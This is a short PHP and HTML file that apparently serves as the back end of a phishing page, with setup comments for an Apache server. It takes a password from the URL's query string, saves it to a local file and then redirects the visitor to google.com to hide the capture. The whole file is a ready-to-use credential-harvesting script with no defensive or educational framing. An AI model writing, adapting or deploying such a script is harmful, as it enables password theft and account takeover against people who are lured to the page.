<?php

#install libapache2-mod-php*
#change php permission to executable, change txt file permission to writable ugo

$pass=$_GET["password"];

#echo $pass;

$myfile = fopen("mypasswd", "w+") or die("Unable to open file!");

fwrite($myfile, $pass);

?>

<html>

<head>

<script type="text/javascript">

function loadUrl()

{

window.location = "https://www.google.com";

}

</script>

</head>

<body onload="loadUrl()"></body>

</html>
